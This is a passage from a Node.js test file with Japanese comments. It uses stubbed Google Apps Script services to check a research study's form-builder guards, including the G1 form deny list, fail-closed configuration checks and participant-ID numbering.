// GSE_O1_Form_Builder.gs のガードをローカルで実測する。
// ★ 実 Google Forms にも実スプレッドシートにも実メールにも一切触らない（全部スタブ）。
//
// ⚠️ ★ ここで測るのは「ガードを書いた」ではなく **「ガードが止める」** である。
//   陽性対照（正当な構築は通る）を必ず含めること。含めないと、全部拒否する実装でも緑になる。
//
// ⚠️★★★ **本ファイル固有の眼目は 2 つある。**
//   1. ★ **O1 のビルダーが G1 のフォームを壊さないこと**（§1）。
//      2026-08-07 に `setupG1Forms` の誤実行で G1-C の全設問が消えている（版履歴は無い）。
//   2. ★ **被験者への約束をコードが破っていないこと**（§6 / §7）。
//      同意文書 §4 は逐語「理由を聞きません」。⚠️ 事後アンケートで理由を聞けば実質が破れる。
//
// 実行: node Form_O1/o1_form_builder_test.cjs
const fs = require("fs");
const vm = require("vm");
const path = require("path");

const REPO = path.join(__dirname, "..");
const BUILDER = process.argv[2] || path.join(__dirname, "GSE_O1_Form_Builder.gs");
const src = fs.readFileSync(BUILDER, "utf8");

// ⚠️★★★ **G1 のビルダーは `Form_G1/` に残る** (2026-08-29 に O1 を `Form_O1/` へ移した)。
//   ★ `__dirname` 基準にすると `Form_O1/GSE_G1_Form_Builder.gs` を探して **必ず落ちる**。
//   → ★ repo 基準で指す。⚠️ この検査は「O1 が G1 のフォーム ID を拒否しているか」を
//     突き合わせる本体なので、⚠️ **落ちると拒否リストの検査ごと消える**。
const G1_BUILDER_PATH = path.join(REPO, "Form_G1", "GSE_G1_Form_Builder.gs");
const CONSENT_DOC = path.join(
  REPO,
  ".steering/20260823-o1-nonkeystroke-gap-and-prereg/consent-draft-o1.md"
);

// ============================================================
// Google Apps Script のスタブ
// ============================================================

/** フォーム項目。★ 何が作られたかを後から読めるように素の値で持つ。 */
function makeItem(type) {
  const it = {
    __type: type,
    __title: "",
    __help: "",
    __required: false,
    __choices: [],
    __validation: null,
    getType: () => type,
    getTitle: () => it.__title,
    setTitle: (t) => {
      it.__title = t;
      return it;
    },
    setHelpText: (t) => {
      it.__help = t;
      return it;
    },
    setRequired: (b) => {
      it.__required = b;
      return it;
    },
    createChoice: (v) => ({ getValue: () => v }),
    setChoices: (cs) => {
      it.__choices = cs.map((c) => c.getValue());
      return it;
    },
    getChoices: () => it.__choices.map((v) => ({ getValue: () => v })),
    setValidation: (v) => {
      it.__validation = v;
      return it;
    },
    isRequired: () => it.__required,
    // 実物の as…Item() は種類が違うと例外を出す。照合が種類を確かめずに呼ぶ誤りを捕まえるため、同じにする。
    asTextItem: () => {
      if (type !== "TEXT") throw new Error("stub: asTextItem on " + type);
      return it;
    },
    asCheckboxItem: () => {
      if (type !== "CHECKBOX") throw new Error("stub: asCheckboxItem on " + type);
      return it;
    },
    asMultipleChoiceItem: () => {
      if (type !== "MULTIPLE_CHOICE") throw new Error("stub: asMultipleChoiceItem on " + type);
      return it;
    },
    asListItem: () => it,
    asPageBreakItem: () => it,
    setGoToPage: () => it,
  };
  return it;
}

/** フォーム。★ `deleteItem` が呼ばれたかを記録する（clearForm が走ったかの判定に使う）。 */
function makeForm(id, opts) {
  const o = opts || {};
  const form = {
    __id: id,
    __title: "",
    __description: "",
    __confirmation: "",
    __items: [],
    __deleted: 0,
    __responses: o.responses === undefined ? 0 : o.responses,
    __responsesThrow: !!o.responsesThrow,
    getId: () => id,
    getTitle: () => form.__title,
    getEditUrl: () => "https://forms.example/" + id + "/edit",
    getPublishedUrl: () => "https://forms.example/" + id + "/view",
    getResponses: () => {
      if (form.__responsesThrow) throw new Error("stub: cannot read responses");
      return new Array(form.__responses).fill({});
    },
    setTitle: (t) => {
      form.__title = t;
    },
    setDescription: (t) => {
      form.__description = t;
    },
    setCollectEmail: () => {},
    setShowLinkToRespondAgain: () => {},
    setConfirmationMessage: (t) => {
      form.__confirmation = t;
    },
    getItems: () => form.__items.slice(),
    deleteItem: (item) => {
      form.__deleted++;
      form.__items = form.__items.filter((x) => x !== item);
    },
  };
  const add = (type) => () => {
    const it = makeItem(type);
    form.__items.push(it);
    return it;
  };
  form.addCheckboxItem = add("CHECKBOX");
  form.addTextItem = add("TEXT");
  form.addParagraphTextItem = add("PARAGRAPH_TEXT");
  form.addMultipleChoiceItem = add("MULTIPLE_CHOICE");
  form.addSectionHeaderItem = add("SECTION_HEADER");
  form.addListItem = add("LIST");
  return form;
}

// ⚠️★★★ **スタブを実物の形に合わせる**（2026-08-29・起票 T-23）。
//   ★ 実物の「参加者ロスター」は **行 1 = 機密バナー / 行 2 = 見出し / 行 3 以降 = データ**
//     （`Form_Phase1/GSE_Phase1_Form_Builder.gs` の `buildRosterTab_` 逐語:
//      「行1: 機密バナー…行2: ヘッダ。行3+: データ」）。
//   ⚠️ 旧スタブは**見出しの無い裸の配列**だったので、「見出しを見る検査」を
//     **書いても空回りしていた**（★ 検査が見ている側と実物がずれる典型）。
const ROSTER_BANNER = ["⚠ 実名・メール↔P-ID 対応表（研究者のみ）。共有・コミット禁止。", "", "", ""];
/** ★ 実物の先頭 4 列（`ROSTER_HEADER` の前半）。⚠️ §11 が実ファイルと照合する。 */
const ROSTER_HEAD_4 = ["P-ID", "氏名/ニックネーム", "メール", "OS"];
const ROSTER_LEAD_ROWS = 2;

/**
 * スプレッドシート（参加者ロスター）のスタブ。★ 2 次元配列を素で持つ。
 *
 * - 既定では **バナー行 + 見出し行**を先頭に付ける（★ 実物と同じ形）。
 * - `opts.raw` … 見出しを付けない（★ `o1NextParticipantId_` の単体テスト用）。
 * - `opts.header` … 見出し行を差し替える（★ 壊れた見出しを撃つ用）。
 * - `__rows` は **データ行だけ**を返す（★ 既存の assertion をそのまま活かす）。
 */
function makeSheet(rows, opts) {
  const o = opts || {};
  const norm = (r) => [r[0] || "", r[1] || "", r[2] || "", r[3] || ""];
  const lead = o.raw ? [] : [ROSTER_BANNER.slice(), (o.header || ROSTER_HEAD_4).slice()];
  const data = lead.concat(rows.map(norm));
  const sheet = {
    __grid: data,
    getLastRow: () => data.length,
    getMaxColumns: () => (o.maxColumns === undefined ? 14 : o.maxColumns),
    getRange: (row, col, numRows, numCols) => {
      if (numRows === undefined) {
        // 単一セル
        return {
          getValue: () => (data[row - 1] ? data[row - 1][col - 1] : ""),
          setValue: (v) => {
            if (data[row - 1]) data[row - 1][col - 1] = v;
          },
        };
      }
      return {
        getValues: () => {
          const out = [];
          for (let r = row - 1; r < row - 1 + numRows; r++) {
            const src = data[r] || ["", "", "", ""];
            out.push(src.slice(col - 1, col - 1 + (numCols || 1)));
          }
          return out;
        },
      };
    },
    appendRow: (r) => {
      data.push(norm(r));
    },
  };
  Object.defineProperty(sheet, "__rows", { get: () => data.slice(lead.length) });
  return sheet;
}

/**
 * ★ 列数を制限しない汎用シートのスタブ（★ 6 列の「O1 登録ログ」用）。
 *
 * ⚠️ `makeSheet` は `norm()` で **4 列に切り詰める**ので、★ 登録ログには使えない
 *   （⚠️ 使うと「理由」「備考」が黙って消え、検査が空回りする）。
 */
function makeWideSheet(rows) {
  const data = (rows || []).map((r) => r.slice());
  const sheet = {
    __grid: data,
    // ★ 見た目（2026-09-28）。値とは別に記録する（⚠️ 値の配列 `data` には触れない）。
    __style: {},
    __frozen: 0,
    __widths: {},
    __tab: null,
    __rules: [],
    getFrozenRows: () => sheet.__frozen,
    setFrozenRows: (n) => {
      sheet.__frozen = n;
    },
    setColumnWidth: (c, w) => {
      sheet.__widths[c] = w;
    },
    setTabColor: (c) => {
      sheet.__tab = c;
    },
    setConditionalFormatRules: (rs) => {
      sheet.__rules = rs.slice();
    },
    getLastRow: () => data.length,
    getMaxColumns: () => 26,
    getRange: (row, col, numRows, numCols) => {
      if (typeof row === "string") return { __a1: row }; // 条件付き書式の範囲だけに使う
      if (numRows === undefined) {
        return {
          getValue: () => (data[row - 1] ? data[row - 1][col - 1] : ""),
          setValue: (v) => {
            if (data[row - 1]) data[row - 1][col - 1] = v;
          },
        };
      }
      const paint = (k) => (v) => {
        for (let r = row; r < row + numRows; r++)
          for (let c = col; c < col + (numCols || 1); c++) {
            const key = r + "," + c;
            sheet.__style[key] = Object.assign({}, sheet.__style[key], { [k]: v });
          }
        return rng;
      };
      const rng = {
        setBackground: paint("bg"),
        setFontColor: paint("fg"),
        setFontWeight: paint("weight"),
        setHorizontalAlignment: paint("halign"),
        setWrap: paint("wrap"),
        // ★ リンク集（2026-10-07）が使う。
        setValues: (vals) => {
          vals.forEach((line, i) => {
            while (data.length < row + i) data.push([]);
            const dst = data[row - 1 + i];
            line.forEach((v, j) => {
              dst[col - 1 + j] = v;
            });
          });
          return rng;
        },
        getValues: () => {
          const out = [];
          for (let r = row - 1; r < row - 1 + numRows; r++) {
            const src = data[r] || [];
            const line = [];
            for (let c = col - 1; c < col - 1 + (numCols || 1); c++) line.push(src[c] === undefined ? "" : src[c]);
            out.push(line);
          }
          return out;
        },
        // ★ 実物と同じく、表示の文字列で返す（日付は表示の形・数値は文字列）。
        getDisplayValues: () =>
          rng.getValues().map((line) =>
            line.map((v) =>
              v instanceof Date
                ? `${v.getFullYear()}/${String(v.getMonth() + 1).padStart(2, "0")}/${String(v.getDate()).padStart(2, "0")}`
                : String(v)
            )
          ),
      };
      return rng;
    },
    appendRow: (r) => {
      data.push(r.slice());
    },
    // ★ リンク集（2026-10-07）は毎回作り直す。
    clear: () => {
      data.length = 0;
      sheet.__style = {};
      sheet.__cleared = (sheet.__cleared || 0) + 1;
    },
  };
  return sheet;
}

/**
 * .gs を vm で読み込み、GAS のグローバルをスタブした文脈を返す。
 * ★ `var` 宣言は文脈のプロパティになるので、テスト側から設定値を差し替えられる。
 */
function makeCtx(opts) {
  const o = opts || {};
  const logs = [];
  const forms = o.forms || {};
  const props = {};
  const mails = [];
  const drafts = [];
  const triggers = [];
  const lock = { locked: false, released: false, failWait: !!o.lockFails };

  const ctx = {
    __logs: logs,
    __forms: forms,
    __props: props,
    __mails: mails,
    __drafts: drafts,
    __triggers: triggers,
    __lock: lock,
    __openedFormIds: [],
    __sheets: o.sheets || {},
    __uuidSeq: 0,
    __onFlush: o.onFlush || null,
    Logger: { log: (m) => logs.push(String(m)) },
    console: { log: (m) => logs.push(String(m)) },
    FormApp: {
      ItemType: {
        MULTIPLE_CHOICE: "MULTIPLE_CHOICE",
        LIST: "LIST",
        PAGE_BREAK: "PAGE_BREAK",
        TEXT: "TEXT",
        CHECKBOX: "CHECKBOX",
        SECTION_HEADER: "SECTION_HEADER",
      },
      PageNavigationType: { CONTINUE: "CONTINUE" },
      openById: (id) => {
        ctx.__openedFormIds.push(id);
        if (!forms[id]) throw new Error("stub: no such form " + id);
        return forms[id];
      },
      createTextValidation: () => {
        const v = { __pattern: null };
        v.requireTextMatchesPattern = (p) => {
          v.__pattern = p;
          return v;
        };
        v.build = () => ({ __pattern: v.__pattern });
        return v;
      },
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => (k in props ? props[k] : null),
        setProperty: (k, v) => {
          props[k] = v;
        },
      }),
    },
    SpreadsheetApp: {
      newConditionalFormatRule() {
        const rule = {};
        const b = {
          whenFormulaSatisfied: (f) => ((rule.formula = f), b),
          setBackground: (v) => ((rule.bg = v), b),
          setFontColor: (v) => ((rule.fg = v), b),
          setRanges: (rs) => ((rule.ranges = rs.map((x) => x.__a1 || "?")), b),
          build: () => rule,
        };
        return b;
      },
      openById: (id) => {
        if (!ctx.__sheets[id]) throw new Error("stub: no such spreadsheet " + id);
        return {
          getUrl: () => "https://sheets.example/" + id,
          getSheetByName: (name) => ctx.__sheets[id][name] || null,
          insertSheet: (name) => {
            ctx.__sheets[id][name] = makeWideSheet([]);
            return ctx.__sheets[id][name];
          },
        };
      },
      flush: () => {
        // ★ 「他プロジェクトが割り込んで append する」状況を再現する差し込み口。
        //   ⚠️ 実物では起こるが、★ スタブでは**明示的に仕込まないと絶対に起きない**
        //     （= 仕込まなければ陰性対照になる）。
        if (typeof ctx.__onFlush === "function") ctx.__onFlush();
      },
    },
    // ★ `o1ReserveToken_` が使う。⚠️ **決定的**にする（乱数だとテストが再現しない）。
    Utilities: {
      getUuid: () => {
        ctx.__uuidSeq += 1;
        return "aaaaaaaa-bbbb-cccc-dddd-" + String(ctx.__uuidSeq).padStart(12, "0");
      },
      formatDate: (d, tz, fmt) => "2026-01-01 00:00:00",
    },
    Session: { getScriptTimeZone: () => "Asia/Tokyo" },
    MailApp: {
      sendEmail: (to, subject, body) => mails.push({ to, subject, body }),
    },
    GmailApp: {
      createDraft: (to, subject, body) => drafts.push({ to, subject, body }),
    },
    LockService: {
      getScriptLock: () => ({
        waitLock: () => {
          if (lock.failWait) throw new Error("stub: lock timeout");
          lock.locked = true;
        },
        releaseLock: () => {
          lock.released = true;
        },
      }),
    },
    ScriptApp: {
      getProjectTriggers: () => triggers.slice(),
      deleteTrigger: (t) => {
        const i = triggers.indexOf(t);
        if (i >= 0) triggers.splice(i, 1);
      },
      newTrigger: (fn) => {
        const t = { __fn: fn, getHandlerFunction: () => fn };
        return {
          forForm: () => ({
            onFormSubmit: () => ({
              create: () => {
                triggers.push(t);
                return t;
              },
            }),
          }),
        };
      },
    },
  };
  vm.createContext(ctx);
  vm.runInContext(src, ctx);
  return ctx;
}

/** 例外を捕まえて {threw, message} を返す。 */
function attempt(fn) {
  try {
    const value = fn();
    return { threw: false, value: value };
  } catch (e) {
    return { threw: true, message: String(e && e.message ? e.message : e) };
  }
}

/** フォーム提出イベントのスタブ（title → value）。 */
function makeResponse(pairs) {
  return {
    response: {
      getItemResponses: () =>
        Object.keys(pairs).map((title) => ({
          getItem: () => ({ getTitle: () => title }),
          getResponse: () => pairs[title],
        })),
    },
  };
}

// ★ gate:allow-id —— ⚠️ **G1 の実フォーム ID をここに置くのは意図的**である。
//   ★ この 3 本は「O1 が G1 のフォームを拒否するか」を突き合わせる**照合相手**であり、
//     ⚠️ ビルダーの拒否リストと**同じ値でなければ検査が成立しない**。
//   ★ フォーム ID は URL に出るので秘密ではない（`GSE_O1_Form_Builder.gs` の注記）。
const G1_CONSENT_ID = "1Hs3NtuOB3IRKHaU6xspL8jd1y4BdVKFK0s4JxHTQdsE"; // gate:allow-id
const G1_MCHECK_ID = "1iDcr0uc_51dEEI_idyJhcozYMX02N3ug-JQ7zSVMHIA"; // gate:allow-id
const G1_SURVEY_ID = "1ScM_420irB8DUA8EFYyDJBaPBR-_lOa4evtveQBVWjU"; // gate:allow-id
const O1_C = "O1FORMCONSENT";
const O1_S = "O1FORMSURVEY";
// ⚠️★★★ **実在のシート ID を書かない**（security-checker HIGH・2026-08-29）。
//   ★ スタブは「キーとして一致していればよい」だけで、⚠️ **中身に意味は無い**。
//   ★ 実 ID を追跡ファイルに置くと、一時 public 運用のとき
//     **参加者ロスター（PII）への直接ポインタ**になる（→ 起票 T-20 / T-21）。
const ROSTER_ID = "SHEET-ID-STUB-NOT-REAL";
/** ★ O1 の登録ログ（⚠️ ロスターとは**別の表**でなければならない）。 */
const MGMT_ID = "MGMT-ID-STUB-NOT-REAL";
/** ⚠️ `O1_MGMT_HEAD` と同じ並び。★ ずれたら §12 が赤くなる（= 2 か所に持つ意図的な冗長）。 */
const MGMT_HEAD_6 = ["記録日時", "種別", "P-ID", "結果", "理由", "備考"];

/** ★ 登録ログ / 却下ログのタブ名（⚠️ .gs の定数と同じ値でなければ検査が空回りする）。 */
const MGMT_TAB = "O1 登録ログ";
const MGMT_REJECT_TAB = "O1 却下ログ";

/** ★ ログタブのスタブ（★ バナー + 見出しつき = 実物と同じ形）。 */
function makeMgmtLog(dataRows) {
  return makeWideSheet(
    [["⚠ バナー"], MGMT_HEAD_6.slice()].concat(dataRows || [])
  );
}
/** ★ 追記された**データ行だけ**を返す（⚠️ バナー + 見出しを除く）。 */
const logRows = (ctx, tab) => {
  const sh = ctx.__sheets[MGMT_ID] && ctx.__sheets[MGMT_ID][tab || MGMT_TAB];
  return sh ? sh.__grid.slice(2) : [];
};

/** 設定が全部揃った文脈を作る（★ 陽性対照の土台）。 */
function makeReadyCtx(extra) {
  const o = extra || {};
  const forms = {
    [O1_C]: makeForm(O1_C, { responses: o.consentResponses || 0 }),
    [O1_S]: makeForm(O1_S, { responses: o.surveyResponses || 0 }),
  };
  const sheets = {
    [ROSTER_ID]: {
      参加者ロスター: makeSheet(o.roster || [["P006", "既存", "old@example.com"]], {
        header: o.rosterHeader,
        maxColumns: o.rosterMaxColumns,
      }),
    },
  };
  // ★ 既定では登録ログも「使える状態」にする（⚠️ 既存 §1〜§11 の陰性対照を壊さないため）。
  //   ★ `o.noMgmtSheet` で不在を、`o.mgmtRows` で中身を差し替えられる。
  if (!o.noMgmtSheet) {
    sheets[MGMT_ID] = {
      [MGMT_TAB]: makeMgmtLog(o.mgmtRows),
      // ⚠️★★★ **却下は別タブ・別枠**（security-checker HIGH・2026-09-03）。
      //   ★ 分けないと、⚠️ 認証なしで第三者が `blocked` 行を積み上げて
      //     **正規の登録の記録まで止められる**（= 監査証跡の遠隔抑止）。
      [MGMT_REJECT_TAB]: makeMgmtLog(o.mgmtRejectRows),
    };
    if (o.mgmtHasRoster) sheets[MGMT_ID]["参加者ロスター"] = makeSheet([["P006", "x", "x@e.com"]]);
  }
  const ctx = makeCtx({ forms, sheets, lockFails: o.lockFails, onFlush: o.onFlush });
  // ⚠️★★ 設定は **スクリプト プロパティ**から読む (2026-08-29 に移した)。
  //   ★ ロスター ID も .gs の既定値ではなくなったので、ここで明示的に入れる。
  ctx.__props.FORM_ID_O1_CONSENT = O1_C;
  ctx.__props.FORM_ID_O1_SURVEY = O1_S;
  ctx.__props.O1_APP_DOWNLOAD_URL = "https://drive.example/o1";
  ctx.__props.PHASE1_MGMT_SHEET_ID = ROSTER_ID;
  if (!o.noMgmtProp) ctx.__props.O1_MGMT_SHEET_ID = o.mgmtSheetId || MGMT_ID;
  return ctx;
}

const cases = [];
const push = (name, ok, got) => cases.push({ name, ok, got });

// ============================================================
// §1 ⚠️★★★ G1 のフォームを壊さない（★ 本ファイルの第 1 の眼目）
// ============================================================
{
  const ctx = makeReadyCtx();
  [
    ["G1-C", G1_CONSENT_ID],
    ["G1-M", G1_MCHECK_ID],
    ["G1-S", G1_SURVEY_ID],
  ].forEach(([label, id]) => {
    const r = attempt(() => ctx.o1AssertNotG1Form_(id, "FORM_ID_O1_CONSENT"));
    push(`§1 ${label} の ID は拒否される`, r.threw, { threw: r.threw });
  });

  // ★ 陽性対照: O1 の ID は通る（全部拒否する実装でも緑にならないようにする）
  const okCase = attempt(() => ctx.o1AssertNotG1Form_(O1_C, "FORM_ID_O1_CONSENT"));
  push("§1 ★ 陽性対照: O1 の ID は拒否されない", !okCase.threw, { threw: okCase.threw });
}

{
  // ⚠️★ **開いてしまってからでは遅い。** openById を呼ぶ前に止まること。
  const ctx = makeReadyCtx();
  const r = attempt(() => ctx.o1OpenFixed_(G1_CONSENT_ID, "FORM_ID_O1_CONSENT"));
  push("§1 ★ G1 の ID では FormApp.openById を呼ばずに止まる", r.threw && ctx.__openedFormIds.length === 0, {
    threw: r.threw,
    opened: ctx.__openedFormIds,
  });
}

{
  // ★ setupO1Forms がフォームを 1 つも開かないこと。
  const ctx = makeReadyCtx();
  ctx.__props.FORM_ID_O1_CONSENT = G1_CONSENT_ID;
  const r = attempt(() => ctx.setupO1Forms());
  push("§1 ★ setupO1Forms は G1 の ID があるとフォームを 1 つも開かない", r.threw && ctx.__openedFormIds.length === 0, {
    threw: r.threw,
    opened: ctx.__openedFormIds.length,
  });
}

{
  const ctx = makeReadyCtx();
  ctx.__props.FORM_ID_O1_SURVEY = G1_SURVEY_ID;
  const problems = ctx.o1ConfigProblems_();
  push(
    "§1 checkO1FormConfig が G1 の ID を問題として報告する",
    problems.some((p) => p.indexOf("G1 のフォーム ID") >= 0),
    { problems: problems.length }
  );
}

{
  // ⚠️★★ **G1 のフォームが「開ける」状態で測る。**
  //   ★ スタブに G1 のフォームを置かないと、`openById` が
  //     「そんなフォームは無い」で落ちるだけで**緑になってしまう**
  //     （＝ ガードを外しても検査が赤くならない。2026-08-28 の変異テストで実測した穴）。
  const ctx = makeReadyCtx();
  ctx.__forms[G1_CONSENT_ID] = makeForm(G1_CONSENT_ID, { responses: 3 });
  ctx.__props.FORM_ID_O1_CONSENT = G1_CONSENT_ID;
  const r = attempt(() => ctx.installO1ConsentTrigger());
  push(
    "§1 installO1ConsentTrigger も G1 の ID を拒否する（★ 開ける状態で測る）",
    r.threw && ctx.__triggers.length === 0,
    { threw: r.threw, triggers: ctx.__triggers.length }
  );
}

{
  // ★ 同じ理由で、構築系も「G1 のフォームが開ける」状態で測る。
  const ctx = makeReadyCtx();
  const g1 = makeForm(G1_CONSENT_ID, { responses: 0 }); // ⚠️ 回答 0 = 段 3 では止まらない
  g1.__items.push(makeItem("TEXT"));
  ctx.__forms[G1_CONSENT_ID] = g1;
  ctx.__props.FORM_ID_O1_CONSENT = G1_CONSENT_ID;
  const r = attempt(() => ctx.buildO1ConsentForm());
  push(
    "§1 ★★★ 回答 0 件の G1 フォームでも設問を 1 つも消さない（★ 段 2 だけが止める場面）",
    r.threw && g1.__deleted === 0 && g1.__items.length === 1,
    { threw: r.threw, deleted: g1.__deleted, items: g1.__items.length }
  );
}

{
  // ⚠️★★ **拒否リストが実在の G1 フォームを全部覆っているか。**
  //   ★ G1 側にフォームが増えたのに拒否リストが古いままだと、ここが赤くなる。
  const ctx = makeReadyCtx();
  const g1src = fs.readFileSync(G1_BUILDER_PATH, "utf8");
  const ids = [];
  const re = /^var\s+FORM_ID_[A-Z_]+\s*=\s*"([^"]+)"/gm;
  let m;
  while ((m = re.exec(g1src)) !== null) ids.push(m[1]);
  const missing = ids.filter((id) => !(id in ctx.G1_FORM_IDS_DO_NOT_TOUCH));
  push("§1 ★★ 拒否リストが G1 の実フォーム ID を全部持っている", ids.length >= 3 && missing.length === 0, {
    found: ids.length,
    missing,
  });
}

{
  // ⚠️★★★ **G1 の破壊的な関数を定義していない**（同じ名前空間に置かないための構造的な検査）。
  const ctx = makeReadyCtx();
  const collisions = ["setupG1Forms", "buildConsentForm", "clearForm", "buildPostSurveyForm"].filter(
    (n) => typeof ctx[n] === "function"
  );
  push("§1 ★ G1 の関数名を定義していない（誤起動の的を作らない）", collisions.length === 0, {
    collisions,
  });
}

// ============================================================
// §2 回答があるフォームを作り直さない（fail-closed）
// ============================================================
{
  const ctx = makeReadyCtx();
  const form = makeForm("X", { responses: 3 });
  const r = attempt(() => ctx.o1AssertSafeToRebuild_(form, "O1-C"));
  push("§2 回答が 3 件あると作り直しを拒否する", r.threw, { threw: r.threw });
}

{
  const ctx = makeReadyCtx();
  const form = makeForm("X", { responses: 0 });
  const r = attempt(() => ctx.o1AssertSafeToRebuild_(form, "O1-C"));
  push("§2 ★ 陽性対照: 回答 0 件なら通る", !r.threw, { threw: r.threw });
}

{
  // ⚠️★ 「確認できなかった」を「0 件」と読み替えない。
  const ctx = makeReadyCtx();
  const form = makeForm("X", { responsesThrow: true });
  const r = attempt(() => ctx.o1AssertSafeToRebuild_(form, "O1-C"));
  push("§2 ★ 回答数を確認できないときも止まる（fail-closed）", r.threw, { threw: r.threw });
}

{
  const ctx = makeReadyCtx();
  ctx.O1_ALLOW_REBUILD_WITH_RESPONSES = true;
  const form = makeForm("X", { responses: 3 });
  const r = attempt(() => ctx.o1AssertSafeToRebuild_(form, "O1-C"));
  const warned = ctx.__logs.some((l) => l.indexOf("紐付けが失われます") >= 0);
  push("§2 明示的に許可したときだけ通り、警告が出る", !r.threw && warned, {
    threw: r.threw,
    warned,
  });
}

{
  // ★ 実際に buildO1ConsentForm が設問を消さないこと（`__deleted` で測る）。
  const ctx = makeReadyCtx({ consentResponses: 2 });
  ctx.__forms[O1_C].__items.push(makeItem("TEXT"));
  const before = ctx.__forms[O1_C].__items.length;
  const r = attempt(() => ctx.buildO1ConsentForm());
  push(
    "§2 ★★ 回答があると buildO1ConsentForm は設問を 1 つも消さない",
    r.threw && ctx.__forms[O1_C].__deleted === 0 && ctx.__forms[O1_C].__items.length === before,
    { threw: r.threw, deleted: ctx.__forms[O1_C].__deleted }
  );
}

// ============================================================
// §3 未設定は fail-closed（★ 量産と空振りを防ぐ）
// ============================================================
{
  const ctx = makeReadyCtx();
  const r = attempt(() => ctx.o1OpenFixed_("", "FORM_ID_O1_CONSENT"));
  push("§3 フォーム ID が空なら開かない", r.threw && ctx.__openedFormIds.length === 0, {
    threw: r.threw,
  });
}

{
  const ctx = makeCtx({ forms: {}, sheets: {} }); // ★ 何も設定していない素の状態
  const r = attempt(() => ctx.setupO1Forms());
  push("§3 素の状態では setupO1Forms が止まる", r.threw, { threw: r.threw });
}

{
  const ctx = makeReadyCtx();
  const base = ctx.o1ConfigProblems_().length;
  ctx.__props.PHASE1_MGMT_SHEET_ID = "";
  const withEmpty = ctx.o1ConfigProblems_();
  push(
    "§3 PHASE1_MGMT_SHEET_ID が空だと問題として報告される",
    base === 0 && withEmpty.some((p) => p.indexOf("PHASE1_MGMT_SHEET_ID") >= 0),
    { base, now: withEmpty.length }
  );
}

{
  const ctx = makeReadyCtx();
  ctx.__props.O1_APP_DOWNLOAD_URL = "";
  const problems = ctx.o1ConfigProblems_();
  push(
    "§3 O1_APP_DOWNLOAD_URL が空だと問題として報告される",
    problems.some((p) => p.indexOf("O1_APP_DOWNLOAD_URL") >= 0),
    { problems: problems.length }
  );
}

{
  // ⚠️★★ **打ち間違いは「未設定」と同じ症状になる**（2026-08-29 に検査を追加）。
  //   ★ 配布フォルダの **ID だけ**を貼るのは実際にやりがちで、
  //     ⚠️ 受付メールには「入手先」としてそのまま載るため被験者が辿れない。
  const ctx = makeReadyCtx();
  // ⚠️★★★ **実在の ID を書かない**（security-checker 指摘・2026-08-29）。
  //   ★ 最初この行に**研究者の実フォルダ ID** を入れてしまった（未コミットで止めた）。
  //   ⚠️ 検査が見るのは「`https://` で始まるか」だけなので、★ 実在の形すら要らない。
  ctx.__props.O1_APP_DOWNLOAD_URL = "not-a-url-just-an-id"; // ★ URL でない値の代表
  const problems = ctx.o1ConfigProblems_();
  push(
    "§3 ★ O1_APP_DOWNLOAD_URL が URL でないと問題として報告される",
    problems.some((p) => p.indexOf("O1_APP_DOWNLOAD_URL") >= 0 && p.indexOf("URL ではありません") >= 0),
    { problems }
  );
}

{
  // ★ 陽性対照: ちゃんとした URL なら問題として挙げない（⚠️ 何でも赤にする実装を弾く）。
  const ctx = makeReadyCtx();
  ctx.__props.O1_APP_DOWNLOAD_URL = "https://drive.google.com/drive/folders/EXAMPLE"; // gate:allow-id ★ 明白な偽値
  const problems = ctx.o1ConfigProblems_();
  push(
    "§3 ★ 正しい URL なら O1_APP_DOWNLOAD_URL を問題にしない（陽性対照）",
    !problems.some((p) => p.indexOf("O1_APP_DOWNLOAD_URL") >= 0),
    { problems }
  );
}

{
  // ⚠️★★★ **古いほうの管理シート**を指したら止める（2026-08-29 に機械化）。
  //   ★ Drive に同名のシートが 2 つあり、⚠️ 古いほうは**実在の P-ID と衝突する**。
  const ctx = makeReadyCtx();
  ctx.__props.PHASE1_MGMT_SHEET_ID = "12T8WU4D-fake-old";
  const problems = ctx.o1ConfigProblems_();
  push(
    "§3 ★ 古いほうの Phase1 管理シートを指すと問題として報告される",
    problems.some((p) => p.indexOf("古いほうの管理シート") >= 0),
    { problems }
  );
}

{
  // ★ 陽性対照: 正しい側のシートは問題にしない（⚠️ 何でも赤にする実装を弾く）。
  const ctx = makeReadyCtx();
  const problems = ctx.o1ConfigProblems_();
  push(
    "§3 ★ 正しい管理シートなら問題にしない（陽性対照）",
    !problems.some((p) => p.indexOf("古いほうの管理シート") >= 0),
    { problems }
  );
}

{
  // ⚠️★★★ **受付メールは「渡されたスナップショット」を使う**（2026-08-29）。
  //   ★ 事前確認と本送信のあいだにプロパティが書き換わると、
  //     ⚠️ **P-ID を焼いた後で throw する**（＝「発番済み・通知なし」）。
  //   → ★ 呼び出し側が 1 回読んだ値を渡せること、⚠️ **渡した値が実際に使われること**を測る。
  const ctx = makeReadyCtx();
  const snapshot = "https://drive.example/snapshot-url";
  ctx.__props.O1_APP_DOWNLOAD_URL = "https://drive.example/CHANGED-AFTER";
  const body = ctx.o1RegisterAckBody_("P015", snapshot);
  push(
    "§9 ★ 受付メールは渡されたスナップショットの URL を使う",
    body.indexOf(snapshot) >= 0 && body.indexOf("CHANGED-AFTER") < 0,
    {}
  );
}

{
  // ⚠️ 同じ ID を 2 本に貼ると片方がもう片方を上書きする。
  const ctx = makeReadyCtx();
  ctx.__props.FORM_ID_O1_SURVEY = O1_C;
  const problems = ctx.o1ConfigProblems_();
  push("§3 2 本のフォーム ID が同じだと問題として報告される", problems.length >= 1, {
    problems: problems.length,
  });
}

{
  const ctx = makeReadyCtx();
  push("§3 ★ 陽性対照: 設定が揃えば問題 0 件", ctx.o1ConfigProblems_().length === 0, {
    problems: ctx.o1ConfigProblems_(),
  });
}

{
  // ★ 受付メールは URL が無ければ作らない（P-ID だけ渡す事態を防ぐ）。
  const ctx = makeReadyCtx();
  ctx.__props.O1_APP_DOWNLOAD_URL = "";
  const r = attempt(() => ctx.o1RegisterAckBody_("P015"));
  push("§3 ★ 配布 URL が無ければ受付メールを作らない", r.threw, { threw: r.threw });
}

// ============================================================
// §4 P-ID の採番（★ Phase1 のロスターと同じ規則）
// ============================================================
{
  const ctx = makeReadyCtx();
  const t = [
    ["空ロスター → P001", [], "P001"],
    ["P006..P014 → P015", [["P006"], ["P007"], ["P014"]], "P015"],
    ["P 以外の行を無視する", [["氏名"], ["P003"], ["備考"]], "P004"],
    ["P999 → P1000（3 桁を超える）", [["P999"]], "P1000"],
    ["★ 文字列比較ではなく数値比較（P9 < P10）", [["P9"], ["P10"]], "P011"],
  ];
